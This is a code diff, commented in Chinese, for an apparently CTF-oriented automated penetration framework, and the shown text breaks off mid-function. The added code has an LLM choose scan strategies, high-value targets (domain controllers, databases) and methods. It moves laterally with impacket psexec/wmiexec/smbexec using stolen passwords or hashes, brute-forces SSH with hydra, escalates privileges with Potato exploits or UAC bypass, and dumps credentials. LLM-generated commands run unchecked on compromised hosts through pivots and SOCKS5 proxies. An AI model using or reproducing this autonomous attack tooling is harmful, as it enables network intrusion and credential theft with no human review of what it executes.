@@ -3,7 +3,7 @@
 内网渗透节点实现
 
 节点:
-- internal_recon_node: 内网侦察节点
+- internal_recon_node: 内网侦察节点 (支持代理)
 - lateral_move_node: 横向移动节点
 - privilege_escalation_node: 权限提升节点 (新增)
 
@@ -11,13 +11,24 @@
 - 独立于Web CTF架构
 - 复用现有工具系统
 - 不修改核心状态结构
+- AI驱动决策贯穿全程
 """
 import json
 import time
+import os
 from typing import Dict, List, Any, Optional
 from llm_client import llm_client
 from config import config
 from tool_framework import ToolRegistry
+
+# 导入远程执行模块
+try:
+    from remote_executor.executors import ProxyExecutor, execute_on_session
+    from remote_executor.session_manager import get_session_manager
+    REMOTE_EXEC_AVAILABLE = True
+except ImportError:
+    print("[Warning] remote_executor module not available")
+    REMOTE_EXEC_AVAILABLE = False
 
 # 导入高级操作模块
 try:
@@ -37,24 +48,28 @@ except ImportError:
 
 def internal_recon_node(state: Dict) -> Dict:
     """
-    [内网侦察节点] 扫描内网主机和服务
+    [内网侦察节点] AI驱动 + SOCKS5代理支持
 
     输入:
         - internal_network_range: 内网网段
         - pivot_host: 跳板机
+        - proxy_info: 代理信息 (SOCKS5)
 
     输出:
         - internal_hosts: 发现的主机列表
         - update CTFState
 
     工作流程:
-        1. 使用fscan扫描目标（快速、全面、自动漏洞识别）
-        2. 解析结果
-        3. 更新状态
+        1. AI决策扫描策略
+        2. 配置SOCKS5代理 (如果可用)
+        3. 使用fscan扫描目标
+        4. 解析结果并AI分析
     """
     network_range = state.get("internal_network_range", "")
     pivot_host = state.get("pivot_host", "")
     current_url = state.get("current_url", "")
+    proxy_info = state.get("proxy_info", {})
+    shell_session = state.get("shell_session", {})
 
     # 从当前URL提取目标IP
     target_ip = ""
@@ -64,7 +79,6 @@ def internal_recon_node(state: Dict) -> Dict:
             ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', current_url)
             if ip_match:
                 target_ip = ip_match.group(1)
-                # 默认扫描单个IP
                 network_range = target_ip
 
     if not network_range:
@@ -74,78 +88,78 @@ def internal_recon_node(state: Dict) -> Dict:
             "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0
         }
 
-    print(f"[InternalRecon] 使用 fscan 扫描目标: {network_range}")
+    # AI决策扫描策略
+    scan_strategy = _ai_decide_scan_strategy(state, network_range)
+    print(f"[InternalRecon] AI决策: {scan_strategy.get('strategy', 'quick')}")
 
-    # 使用 fscan 扫描
+    # 检查是否需要通过SOCKS5代理扫描
+    use_proxy = False
+    proxy_executor = None
+
+    if proxy_info and proxy_info.get("socks5_address"):
+        socks_addr = proxy_info.get("socks5_address", "")
+        socks_port = proxy_info.get("socks5_port", 10800)
+
+        if socks_addr:
+            print(f"[InternalRecon] 通过SOCKS5代理扫描: {socks_addr}:{socks_port}")
+            use_proxy = True
+
+            if REMOTE_EXEC_AVAILABLE:
+                proxy_executor = ProxyExecutor(
+                    proxy_host=socks_addr,
+                    proxy_port=socks_port,
+                    proxy_type="socks5"
+                )
+
+    # 执行扫描
     try:
-        fscan_result = ToolRegistry.execute_cached(
-            "fscan",
-            network_range,
-            {
-                "scan_type": "quick",
-                "brute": True,
-                "no_ping": True
-            }
-        )
+        # 方式1: 通过跳板机上的工具扫描 (推荐)
+        session_id = shell_session.get("session_id", "")
+        if session_id and REMOTE_EXEC_AVAILABLE:
+            print(f"[InternalRecon] 通过跳板机扫描...")
+            result = _scan_via_pivot(state, network_range, scan_strategy)
 
-        # 检查结果有效性
-        if fscan_result and fscan_result.get("result", {}).get("success"):
-            result = fscan_result.get("result", {})
-            hosts_data = result.get("hosts", [])
-            vulnerabilities = result.get("vulnerabilities", [])
+        # 方式2: 通过本地SOCKS5代理扫描
+        elif use_proxy and proxy_executor:
+            print(f"[InternalRecon] 通过本地代理扫描...")
+            result = _scan_via_proxy(proxy_executor, network_range, scan_strategy)
 
-            if hosts_data:
-                # 解析主机
-                hosts = []
-                for host_data in hosts_data:
-                    if not isinstance(host_data, dict):
-                        continue
+        # 方式3: 直接本地扫描 (外网可达)
+        else:
+            print(f"[InternalRecon] 本地直接扫描: {network_range}")
+            result = _scan_local(network_range, scan_strategy)
 
-                    host_info = {
-                        "ip": host_data.get("ip", ""),
-                        "hostname": "",
-                        "os": "",
-                        "ports": []
-                    }
+        # 处理扫描结果
+        if result.get("success"):
+            hosts = result.get("hosts", [])
 
-                    for port in host_data.get("ports", []):
-                        if port.get("state") == "open" or port.get("port"):
-                            host_info["ports"].append({
-                                "port": port.get("port"),
-                                "protocol": "tcp",
-                                "service": port.get("service", ""),
-                                "version": ""
-                            })
+            if hosts:
+                print(f"[InternalRecon] 发现 {len(hosts)} 台主机")
 
-                    if host_info["ports"] and host_info["ip"]:
-                        hosts.append(host_info)
+                # AI分析发现
+                analysis = _analyze_internal_hosts(hosts, state)
 
-                if hosts:
-                    print(f"[InternalRecon] fscan 发现 {len(hosts)} 台主机")
+                # AI选择下一个目标
+                first_target = _ai_select_next_target(hosts, state)
 
-                    # AI分析发现
-                    analysis = _analyze_internal_hosts(hosts)
-
-                    # 选择高价值目标
-                    first_target = _select_high_value_target(hosts)
-
-                    return {
-                        "internal_hosts": hosts,
-                        "internal_mode": True,
-                        "current_internal_target": first_target,
-                        "analyst_intel": analysis,
-                        "execution_steps": state.get("execution_steps", 0) + 1
-                    }
+                return {
+                    "internal_hosts": hosts,
+                    "internal_mode": True,
+                    "current_internal_target": first_target,
+                    "analyst_intel": analysis,
+                    "scan_strategy": scan_strategy,
+                    "execution_steps": state.get("execution_steps", 0) + 1
+                }
 
         # 无结果
         return {
-            "error": "fscan 未发现存活主机或端口",
+            "error": result.get("error", "未发现存活主机或端口"),
             "internal_mode": False,
             "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5
         }
 
     except Exception as e:
-        print(f"[InternalRecon] fscan 异常: {e}")
+        print(f"[InternalRecon] 扫描异常: {e}")
         return {
             "error": f"扫描异常: {str(e)}",
             "internal_mode": False,
@@ -153,15 +167,295 @@ def internal_recon_node(state: Dict) -> Dict:
         }
 
 
+def _ai_decide_scan_strategy(state: Dict, network_range: str) -> Dict:
+    """
+    AI决策扫描策略
+
+    根据目标环境、时间限制、资源情况决定最优扫描方式
+    """
+    internal_hosts = state.get("internal_hosts") or []
+    credentials = state.get("credentials") or []
+    execution_steps = state.get("execution_steps", 0)
+
+    prompt = f"""
+分析内网环境，决策最优扫描策略。
+
+## 环境
+- 目标网段: {network_range}
+- 已发现主机: {len(internal_hosts)} 台
+- 已获取凭据: {len(credentials)} 组
+- 执行步数: {execution_steps}
+
+## 扫描选项
+- quick: 快速扫描 (常用端口，速度快)
+- full: 全端口扫描 (慢但全面)
+- vuln: 漏洞扫描 (带漏洞探测)
+- brute: 暴力破解 (尝试常见弱口令)
+
+## 要求
+1. 选择最合适的扫描策略
+2. 给出扫描参数建议
+3. 考虑时间和隐蔽性
+
+## 输出格式 (JSON)
+{{
+    "strategy": "quick/full/vuln/brute",
+    "ports": "端口列表或范围",
+    "timeout": 超时建议,
+    "reasoning": "选择理由"
+}}
+"""
+
+    try:
+        response = llm_client.call_chat_completion(
+            model=config.ANALYST_MODEL,
+            messages=[{"role": "user", "content": prompt}],
+            temperature=0.1,
+            json_mode=True
+        )
+
+        if "```json" in response:
+            response = response.split("```json")[1].split("```")[0]
+
+        strategy = json.loads(response.strip())
+        return strategy
+
+    except Exception as e:
+        print(f"[InternalRecon] AI决策失败: {e}")
+        return {"strategy": "quick", "ports": "1-1000", "timeout": 300}
+
+
+def _scan_via_pivot(state: Dict, network_range: str, strategy: Dict) -> Dict:
+    """
+    通过跳板机扫描内网
+
+    在跳板机上执行fscan等工具
+    """
+    shell_session = state.get("shell_session", {})
+    session_id = shell_session.get("session_id", "")
+    os_type = shell_session.get("os_type", "linux")
+
+    if not session_id or not REMOTE_EXEC_AVAILABLE:
+        return {"success": False, "error": "无可用的跳板机会话"}
+
+    session_manager = get_session_manager()
+    session = session_manager.get_session(session_id)
+
+    if not session:
+        return {"success": False, "error": "会话不存在"}
+
+    # 确定工具路径
+    if os_type == "windows":
+        tool_path = "C:\\temp\\fscan.exe"
+    else:
+        tool_path = "/tmp/fscan"
+
+    # 构建扫描命令
+    ports = strategy.get("ports", "1-1000")
+    scan_type = strategy.get("strategy", "quick")
+
+    # AI生成扫描命令
+    prompt = f"""
+生成fscan扫描命令。
+
+## 参数
+- 工具路径: {tool_path}
+- 目标网段: {network_range}
+- 端口: {ports}
+- 扫描类型: {scan_type}
+- 操作系统: {os_type}
+
+## 要求
+输出完整的扫描命令，只输出命令，不要解释。
+"""
+
+    try:
+        cmd = llm_client.call_chat_completion(
+            model=config.ANALYST_MODEL,
+            messages=[{"role": "user", "content": prompt}],
+            temperature=0.1
+        ).strip()
+
+        print(f"[InternalRecon] 执行: {cmd}")
+
+        result = execute_on_session(session, cmd, timeout=strategy.get("timeout", 300))
+
+        if result.success:
+            # 解析fscan输出
+            hosts = _parse_fscan_output(result.output)
+            return {"success": True, "hosts": hosts}
+        else:
+            return {"success": False, "error": result.error}
+
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+
+def _scan_via_proxy(proxy_executor, network_range: str, strategy: Dict) -> Dict:
+    """
+    通过SOCKS5代理扫描
+
+    使用proxychains执行本地fscan
+    """
+    # fscan命令
+    ports = strategy.get("ports", "1-1000")
+    cmd = f"fscan -h {network_range} -p {ports} -o /tmp/fscan_result.txt"
+
+    try:
+        result = proxy_executor.execute_via_proxychains(cmd, timeout=strategy.get("timeout", 300))
+
+        if result.success:
+            hosts = _parse_fscan_output(result.output)
+            return {"success": True, "hosts": hosts}
+        else:
+            return {"success": False, "error": result.error}
+
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+
+def _scan_local(network_range: str, strategy: Dict) -> Dict:
+    """
+    本地直接扫描 (外网可达场景)
+    """
+    ports = strategy.get("ports", "1-1000")
+
+    try:
+        fscan_result = ToolRegistry.execute_cached(
+            "fscan",
+            network_range,
+            {
+                "scan_type": strategy.get("strategy", "quick"),
+                "brute": strategy.get("strategy") == "brute",
+                "no_ping": True
+            }
+        )
+
+        if fscan_result and fscan_result.get("result", {}).get("success"):
+            result = fscan_result.get("result", {})
+            hosts_data = result.get("hosts", [])
+
+            hosts = []
+            for host_data in hosts_data:
+                if not isinstance(host_data, dict):
+                    continue
+
+                host_info = {
+                    "ip": host_data.get("ip", ""),
+                    "hostname": "",
+                    "os": "",
+                    "ports": []
+                }
+
+                for port in host_data.get("ports", []):
+                    if port.get("state") == "open" or port.get("port"):
+                        host_info["ports"].append({
+                            "port": port.get("port"),
+                            "protocol": "tcp",
+                            "service": port.get("service", ""),
+                            "version": ""
+                        })
+
+                if host_info["ports"] and host_info["ip"]:
+                    hosts.append(host_info)
+
+            return {"success": True, "hosts": hosts}
+
+        return {"success": False, "error": "扫描无结果"}
+
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+
+def _parse_fscan_output(output: str) -> List[Dict]:
+    """
+    解析fscan输出 - AI辅助解析
+    """
+    hosts = {}
+    import re
+
+    # fscan输出格式: IP:Port open
+    for line in output.split('\n'):
+        match = re.search(r'(\d+\.\d+\.\d+\.\d+):(\d+)', line)
+        if match:
+            ip = match.group(1)
+            port = int(match.group(2))
+
+            if ip not in hosts:
+                hosts[ip] = {
+                    "ip": ip,
+                    "hostname": "",
+                    "os": "",
+                    "ports": []
+                }
+
+            hosts[ip]["ports"].append({
+                "port": port,
+                "protocol": "tcp",
+                "service": "",
+                "version": ""
+            })
+
+    return list(hosts.values())
+
+
+def _ai_select_next_target(hosts: List[Dict], state: Dict) -> str:
+    """
+    AI选择下一个攻击目标
+
+    综合考虑:
+    - 高价值目标 (域控、数据库)
+    - 已攻陷主机
+    - 攻击成本
+    """
+    active_sessions = state.get("active_sessions") or []
+    compromised = [s.get("host") for s in active_sessions if s.get("host")]
+
+    prompt = f"""
+选择下一个攻击目标。
+
+## 已发现主机
+{json.dumps(hosts[:15], ensure_ascii=False, indent=2)}
+
+## 已攻陷主机
+{compromised}
+
+## 要求
+1. 选择高价值目标
+2. 避免已攻陷的主机
+3. 考虑攻击可行性
+
+## 输出格式 (JSON)
+{{
+    "target": "目标IP",
+    "reason": "选择理由",
+    "attack_method": "推荐攻击方法"
+}}
+"""
+
+    try:
+        response = llm_client.call_chat_completion(
+            model=config.ANALYST_MODEL,
+            messages=[{"role": "user", "content": prompt}],
+            temperature=0.1,
+            json_mode=True
+        )
+
+        if "```json" in response:
+            response = response.split("```json")[1].split("```")[0]
+
+        result = json.loads(response.strip())
+        print(f"[InternalRecon] AI选择目标: {result.get('target')} - {result.get('reason')}")
+        return result.get("target", "")
+
+    except Exception:
+        # 降级: 选择高价值目标
+        return _select_high_value_target(hosts)
+
+
 def _select_high_value_target(hosts: List[Dict]) -> str:
     """
-    选择高价值目标
-
-    优先级:
-    1. 域控制器 (88, 389, 636, 3268端口)
-    2. 数据库服务器 (1433, 3306, 5432端口)
-    3. 文件服务器 (445端口)
-    4. 第一个可用主机
+    选择高价值目标 (降级方案)
     """
     for host in hosts:
         ports = [p.get("port") for p in host.get("ports", []) if p.get("port")]
@@ -175,46 +469,95 @@ def _select_high_value_target(hosts: List[Dict]) -> str:
         if 445 in ports:
             return host.get("ip", "")
 
-    # 返回第一个
     return hosts[0].get("ip", "") if hosts else ""
+
+
+def _analyze_internal_hosts(hosts: List[Dict], state: Dict = None) -> str:
+    """
+    AI分析内网主机发现 - 压缩上下文避免爆炸
+    """
+    if not hosts:
+        return "未发现内网主机"
+
+    # 压缩主机信息为摘要格式
+    summary_lines = []
+    for host in hosts[:10]:  # 只分析前10个
+        ports = host.get("ports") or []
+        ports_str = ", ".join([f"{p.get('port', '?')}" for p in ports[:5] if isinstance(p, dict)])
+        summary_lines.append(f"{host.get('ip', '?')}: [{ports_str}]")
+
+    summary = "\n".join(summary_lines)
+
+    # 统计信息 (压缩上下文)
+    stats = {
+        "total_hosts": len(hosts),
+        "total_ports": sum(len(h.get("ports", [])) for h in hosts),
+        "has_dc": any(any(p.get("port") in [88, 389, 636, 3268] for p in h.get("ports", [])) for h in hosts),
+        "has_db": any(any(p.get("port") in [1433, 3306, 5432] for p in h.get("ports", [])) for h in hosts),
+    }
+
+    prompt = f"""
+分析内网扫描结果，识别高价值目标。
+
+## 统计
+- 主机数: {stats['total_hosts']}
+- 端口数: {stats['total_ports']}
+- 发现域控: {stats['has_dc']}
+- 发现数据库: {stats['has_db']}
+
+## 主机摘要
+{summary}
+
+## 要求
+输出一行分析结论，包括:
+1. 高价值目标
+2. 推荐攻击方法
+"""
+
+    try:
+        analysis = llm_client.call_chat_completion(
+            model=config.ANALYST_MODEL,
+            messages=[{"role": "user", "content": prompt}],
+            temperature=0.1
+        ).strip()
+
+        return analysis
+
+    except Exception:
+        return f"发现 {len(hosts)} 台主机，建议优先测试开放445/3389端口的主机"
 
 
 def lateral_move_node(state: Dict) -> Dict:
     """
-    [横向移动节点] 尝试横向移动到其他主机
+    [横向移动节点] AI驱动的横向移动
 
     输入:
         - current_internal_target: 当前目标
         - credentials: 已获取的凭据
         - internal_hosts: 已发现的主机
+        - proxy_info: 代理信息
 
     输出:
         - active_sessions: 新会话
         - lateral_movement_paths: 移动路径
 
-    工作流程:
-        1. 选择目标主机
-        2. 选择合适的移动方法
-        3. 执行横向移动
-        4. 记录结果
+    AI决策:
+        1. 选择最优目标
+        2. 选择最佳攻击方法
+        3. 选择合适的凭据
+        4. 通过代理执行
     """
     # 安全获取列表，处理None值
     target = state.get("current_internal_target", "")
     credentials = state.get("credentials") or []
     internal_hosts = state.get("internal_hosts") or []
     active_sessions = state.get("active_sessions") or []
+    proxy_info = state.get("proxy_info", {})
+    shell_session = state.get("shell_session", {})
 
     if not target:
-        # 选择下一个目标
-        for host in internal_hosts:
-            if not isinstance(host, dict):
-                continue
-            host_ip = host.get("ip")
-            if host_ip and host_ip != state.get("pivot_host"):
-                # 检查是否已经攻陷
-                if host_ip not in [s.get("host") for s in active_sessions if s.get("host")]:
-                    target = host_ip
-                    break
+        # AI选择下一个目标
+        target = _ai_select_next_target(internal_hosts, state)
 
     if not target:
         return {
@@ -230,50 +573,58 @@ def lateral_move_node(state: Dict) -> Dict:
             "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0
         }
 
-    # [优化] 智能选择最适合目标主机的凭据
-    cred = _select_best_credential(credentials, target, internal_hosts)
-
-    print(f"[LateralMove] 尝试移动到 {target} 使用 {cred.get('username', 'unknown')}")
-
-    # 根据目标端口选择方法
+    # 获取目标主机信息
     target_host = next(
         (h for h in internal_hosts if isinstance(h, dict) and h.get("ip") == target),
         {}
     )
     ports = target_host.get("ports") or []
 
-    method = _select_lateral_method(ports)
+    # AI决策横向移动策略
+    move_strategy = _ai_decide_lateral_strategy(target, target_host, credentials, state)
+
+    print(f"[LateralMove] AI决策: {move_strategy.get('method')} -> {target}")
 
     # 执行横向移动
     result = None
+    method = move_strategy.get("method", "psexec")
+    cred = move_strategy.get("credential", credentials[0] if credentials else {})
+
     try:
-        if method == "psexec" or method == "wmiexec":
-            result = ToolRegistry.execute_cached(
-                "impacket",
-                target,
-                {
-                    "script": method,
-                    "target": target,
-                    "username": cred.get("username", ""),
-                    "password": cred.get("password", ""),
-                    "domain": cred.get("domain", ""),
-                    "hash": cred.get("hash", ""),
-                    "command": "whoami"
-                }
-            )
-        elif method == "ssh":
-            result = ToolRegistry.execute_cached(
-                "hydra",
-                target,
-                {
-                    "target": target,
-                    "protocol": "ssh",
-                    "username": cred.get("username", ""),
-                    "password": cred.get("password", "")
-                }
-            )
+        # 根据是否需要代理选择执行方式
+        if proxy_info and REMOTE_EXEC_AVAILABLE:
+            # 通过代理执行
+            result = _execute_lateral_via_proxy(target, method, cred, proxy_info)
+        elif shell_session.get("session_id") and REMOTE_EXEC_AVAILABLE:
+            # 通过跳板机执行
+            result = _execute_lateral_via_pivot(target, method, cred, shell_session)
         else:
-            result = {"error": f"未知的横向移动方法: {method}"}
+            # 本地直接执行
+            if method in ["psexec", "wmiexec", "smbexec"]:
+                result = ToolRegistry.execute_cached(
+                    "impacket",
+                    target,
+                    {
+                        "script": method,
+                        "target": target,
+                        "username": cred.get("username", ""),
+                        "password": cred.get("password", ""),
+                        "domain": cred.get("domain", ""),
+                        "hash": cred.get("hash", ""),
+                        "command": "whoami"
+                    }
+                )
+            elif method == "ssh":
+                result = ToolRegistry.execute_cached(
+                    "hydra",
+                    target,
+                    {
+                        "target": target,
+                        "protocol": "ssh",
+                        "username": cred.get("username", ""),
+                        "password": cred.get("password", "")
+                    }
+                )
 
         # 处理结果
         if result and result.get("result", {}).get("success"):
@@ -296,11 +647,10 @@ def lateral_move_node(state: Dict) -> Dict:
             return {
                 "active_sessions": [session],
                 "lateral_movement_paths": [move_path],
-                "pivot_host": target,  # 更新跳板机
+                "pivot_host": target,
                 "execution_steps": state.get("execution_steps", 0) + 1
             }
 
-        # 提取更详细的错误信息
         error_msg = "横向移动失败"
         if result:
             if result.get("error"):
@@ -322,6 +672,189 @@ def lateral_move_node(state: Dict) -> Dict:
             "error": f"横向移动异常: {str(e)}",
             "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0
         }
+
+
+def _ai_decide_lateral_strategy(
+    target: str,
+    target_host: Dict,
+    credentials: List[Dict],
+    state: Dict
+) -> Dict:
+    """
+    AI决策横向移动策略
+
+    分析:
+    - 目标系统类型和开放端口
+    - 可用凭据
+    - 代理状态
+    - 攻击成本
+    """
+    ports = target_host.get("ports") or []
+    ports_str = ", ".join([str(p.get("port", "?")) for p in ports[:10]])
+
+    # 压缩凭据信息
+    creds_summary = []
+    for c in credentials[:5]:
+        domain = c.get("domain", "WORKGROUP")
+        user = c.get("username", "?")
+        has_pass = "yes" if c.get("password") else "no"
+        has_hash = "yes" if c.get("hash") else "no"
+        creds_summary.append(f"{user}@{domain} (pass:{has_pass}, hash:{has_hash})")
+
+    prompt = f"""
+分析目标，决策最佳横向移动策略。
+
+## 目标信息
+- IP: {target}
+- 开放端口: {ports_str}
+
+## 可用凭据
+{chr(10).join(creds_summary) if creds_summary else '无'}
+
+## 可用方法
+- psexec: 需要SMB(445), 管理员权限
+- wmiexec: 需要WMI(135), 管理员权限
+- smbexec: 需要SMB(445), 较隐蔽
+- ssh: 需要SSH(22), 普通用户即可
+- evil-winrm: 需要WinRM(5985/5986), 管理员权限
+
+## 输出格式 (JSON)
+{{
+    "method": "psexec/wmiexec/smbexec/ssh/evil-winrm",
+    "credential_index": 0,
+    "reason": "选择理由",
+    "risk_level": "low/medium/high"
+}}
+"""
+
+    try:
+        response = llm_client.call_chat_completion(
+            model=config.ANALYST_MODEL,
+            messages=[{"role": "user", "content": prompt}],
+            temperature=0.1,
+            json_mode=True
+        )
+
+        if "```json" in response:
+            response = response.split("```json")[1].split("```")[0]
+
+        result = json.loads(response.strip())
+
+        # 获取选择的凭据
+        cred_idx = result.get("credential_index", 0)
+        if 0 <= cred_idx < len(credentials):
+            result["credential"] = credentials[cred_idx]
+        else:
+            result["credential"] = credentials[0] if credentials else {}
+
+        return result
+
+    except Exception as e:
+        print(f"[LateralMove] AI决策失败: {e}")
+        # 降级: 基于规则选择
+        method = _select_lateral_method(ports)
+        return {
+            "method": method,
+            "credential": credentials[0] if credentials else {},
+            "reason": "降级规则选择"
+        }
+
+
+def _execute_lateral_via_proxy(target: str, method: str, cred: Dict, proxy_info: Dict) -> Dict:
+    """通过代理执行横向移动"""
+    if not REMOTE_EXEC_AVAILABLE:
+        return {"error": "代理执行模块不可用"}
+
+    socks_addr = proxy_info.get("socks5_address", "127.0.0.1")
+    socks_port = proxy_info.get("socks5_port", 10800)
+
+    proxy_exec = ProxyExecutor(
+        proxy_host=socks_addr,
+        proxy_port=socks_port,
+        proxy_type="socks5"
+    )
+
+    # 构建impacket命令
+    if method in ["psexec", "wmiexec", "smbexec"]:
+        domain = cred.get("domain", "")
+        username = cred.get("username", "")
+        password = cred.get("password", "")
+        hash_val = cred.get("hash", "")
+
+        # 构建认证字符串
+        if domain:
+            auth = f"{domain}/{username}"
+        else:
+            auth = username
+
+        if hash_val:
+            cmd = f"impacket-{method} -hashes {hash_val} {auth}@{target}"
+        else:
+            cmd = f"impacket-{method} {auth}:{password}@{target}"
+
+        result = proxy_exec.execute_via_proxychains(cmd, timeout=120)
+        return {
+            "result": {
+                "success": result.success,
+                "output": result.output,
+                "error": result.error
+            }
+        }
+
+    return {"error": f"不支持的代理方法: {method}"}
+
+
+def _execute_lateral_via_pivot(target: str, method: str, cred: Dict, shell_session: Dict) -> Dict:
+    """通过跳板机执行横向移动"""
+    if not REMOTE_EXEC_AVAILABLE:
+        return {"error": "远程执行模块不可用"}
+
+    session_id = shell_session.get("session_id", "")
+    if not session_id:
+        return {"error": "无有效会话"}
+
+    session_manager = get_session_manager()
+    session = session_manager.get_session(session_id)
+
+    if not session:
+        return {"error": "会话不存在"}
+
+    # AI生成横向移动命令
+    prompt = f"""
+生成横向移动命令。
+
+## 目标
+- IP: {target}
+- 方法: {method}
+
+## 凭据
+- 用户: {cred.get('username', '')}
+- 密码: {cred.get('password', '')}
+- 哈希: {cred.get('hash', '')}
+- 域: {cred.get('domain', '')}
+
+## 要求
+输出完整的命令，只输出命令。
+"""
+
+    try:
+        cmd = llm_client.call_chat_completion(
+            model=config.ANALYST_MODEL,
+            messages=[{"role": "user", "content": prompt}],
+            temperature=0.1
+        ).strip()
+
+        result = execute_on_session(session, cmd, timeout=120)
+
+        return {
+            "result": {
+                "success": result.success,
+                "output": result.output,
+                "error": result.error
+            }
+        }
+    except Exception as e:
+        return {"error": str(e)}
 
 
 def _select_best_credential(
@@ -431,31 +964,25 @@ def _select_lateral_method(ports: List[Dict]) -> str:
 
 def privilege_escalation_node(state: Dict) -> Dict:
     """
-    [权限提升节点] 尝试在当前会话中提权
+    [权限提升节点] AI驱动的权限提升
 
     输入:
         - active_sessions: 活跃会话
         - current_internal_target: 当前目标
+        - shell_session: Shell会话信息
 
     输出:
         - active_sessions: 更新后的会话（包含提权状态）
         - credentials: 新获取的凭据
 
-    工作流程:
-        1. 检查当前权限
-        2. 选择合适的提权方法
-        3. 执行提权
-        4. 尝试凭据转储
+    AI决策:
+        1. 分析系统信息选择提权方法
+        2. 动态生成提权命令
+        3. 处理提权失败的重试策略
     """
-    if not ADVANCED_OPS_AVAILABLE:
-        return {
-            "error": "高级操作模块不可用",
-            "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5
-        }
-
-    # 安全获取列表
     active_sessions = state.get("active_sessions") or []
     credentials = state.get("credentials") or []
+    shell_session = state.get("shell_session", {})
 
     if not active_sessions:
         return {
@@ -467,65 +994,314 @@ def privilege_escalation_node(state: Dict) -> Dict:
     # 选择第一个会话进行提权
     session = active_sessions[0]
     target = session.get("host", "")
+    os_type = session.get("os_type", shell_session.get("os_type", "linux"))
+    is_admin = session.get("is_admin", False)
 
-    print(f"[PrivEsc] 检查 {target} 的权限状态...")
+    print(f"[PrivEsc] AI分析 {target} ({os_type}) 的提权路径...")
+
+    # 如果已经有管理员权限，直接尝试凭据转储
+    if is_admin:
+        print(f"[PrivEsc] 已有管理员权限，尝试凭据转储")
+        return _ai_credential_dump(state, session, active_sessions, credentials, shell_session)
+
+    # AI决策提权策略
+    priv_strategy = _ai_decide_privesc_strategy(target, os_type, session, state)
+
+    print(f"[PrivEsc] AI决策: {priv_strategy.get('method')} - {priv_strategy.get('reason', '')}")
+
+    # 执行提权
+    if REMOTE_EXEC_AVAILABLE and shell_session.get("session_id"):
+        result = _execute_privesc_via_session(shell_session, priv_strategy, os_type)
+    else:
+        # 使用高级操作模块
+        if ADVANCED_OPS_AVAILABLE:
+            result = _execute_privesc_advanced(session, priv_strategy)
+        else:
+            return {
+                "error": "提权模块不可用",
+                "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5
+            }
+
+    if result.get("success"):
+        print(f"[PrivEsc] 提权成功！")
+        session["is_admin"] = True
+        session["is_system"] = result.get("is_system", False)
+
+        # 尝试凭据转储
+        return _ai_credential_dump(state, session, active_sessions, credentials, shell_session)
+    else:
+        print(f"[PrivEsc] 提权失败: {result.get('error', '')}")
+
+        # AI决策下一步
+        next_step = priv_strategy.get("on_failure", "retry")
+        if next_step == "abandon":
+            return {
+                "error": result.get("error", "提权失败"),
+                "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0,
+                "active_sessions": active_sessions
+            }
+        else:
+            return {
+                "error": result.get("error", "提权失败"),
+                "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5,
+                "active_sessions": active_sessions
+            }
+
+
+def _ai_decide_privesc_strategy(target: str, os_type: str, session: Dict, state: Dict) -> Dict:
+    """
+    AI决策提权策略
+
+    分析:
+    - 系统版本
+    - 已有权限
+    - 可用工具
+    - 历史尝试
+    """
+    is_admin = session.get("is_admin", False)
+
+    # 提权方法选项
+    if os_type == "windows":
+        methods = [
+            "PrintSpoofer: SeImpersonate权限，Win10/2016+",
+            "SweetPotato: COM/DCOM滥用，更通用",
+            "JuicyPotato: Win2012及更早",
+            "RoguePotato: 需要出网",
+            "Bypass-UAC: 绕过UAC",
+            "Token-Impersonate: 令牌模拟"
+        ]
+    else:
+        methods = [
+            "SUID二进制: 查找SUID文件",
+            "Sudo配置: sudo -l",
+            "内核漏洞: 内核版本提权",
+            "Cron任务: 计划任务",
+            "Docker逃逸: 容器环境",
+            "密码文件: 敏感文件搜索"
+        ]
+
+    prompt = f"""
+分析目标系统，决策最佳提权策略。
+
+## 目标信息
+- IP: {target}
+- 操作系统: {os_type}
+- 当前权限: {'管理员' if is_admin else '普通用户'}
+
+## 可用方法
+{chr(10).join(methods)}
+
+## 输出格式 (JSON)
+{{
+    "method": "方法名称",
+    "commands": ["执行命令列表"],
+    "reason": "选择理由",
+    "on_failure": "retry/abandon"
+}}
+"""
 
     try:
-        # 检查当前权限
-        priv_check = PrivilegeEscalation.check_privileges(session)
+        response = llm_client.call_chat_completion(
+            model=config.ANALYST_MODEL,
+            messages=[{"role": "user", "content": prompt}],
+            temperature=0.1,
+            json_mode=True
+        )
 
-        if priv_check.get("is_system"):
-            print(f"[PrivEsc] 已是 SYSTEM/ROOT 权限")
-            return {
-                "active_sessions": active_sessions,
-                "execution_steps": state.get("execution_steps", 0) + 1
-            }
+        if "```json" in response:
+            response = response.split("```json")[1].split("```")[0]
 
-        if priv_check.get("is_admin"):
-            print(f"[PrivEsc] 已是管理员权限，尝试转储凭据")
-            # 尝试凭据转储
-            return _attempt_credential_dump(state, session, active_sessions, credentials)
-
-        # 获取可用的提权方法
-        available_methods = priv_check.get("available_methods", [])
-        if not available_methods:
-            print(f"[PrivEsc] 未发现可用的提权方法")
-            return {
-                "error": "未发现可用的提权方法",
-                "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5,
-                "active_sessions": active_sessions
-            }
-
-        # 尝试最高置信度的方法
-        best_method = max(available_methods, key=lambda m: m.get("confidence", 0))
-        method_name = best_method.get("name")
-
-        print(f"[PrivEsc] 尝试使用 {method_name} 提权...")
-
-        result = PrivilegeEscalation.attempt_escalation(session, method_name)
-
-        if result.status == OperationStatus.SUCCESS:
-            print(f"[PrivEsc] 提权成功！")
-            # 更新会话状态
-            session["is_admin"] = True
-
-            # 尝试凭据转储
-            return _attempt_credential_dump(state, session, active_sessions, credentials)
-
-        else:
-            print(f"[PrivEsc] 提权失败: {result.message}")
-            return {
-                "error": result.message,
-                "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5,
-                "active_sessions": active_sessions
-            }
+        return json.loads(response.strip())
 
     except Exception as e:
-        print(f"[PrivEsc] 异常: {e}")
-        return {
-            "error": f"提权异常: {str(e)}",
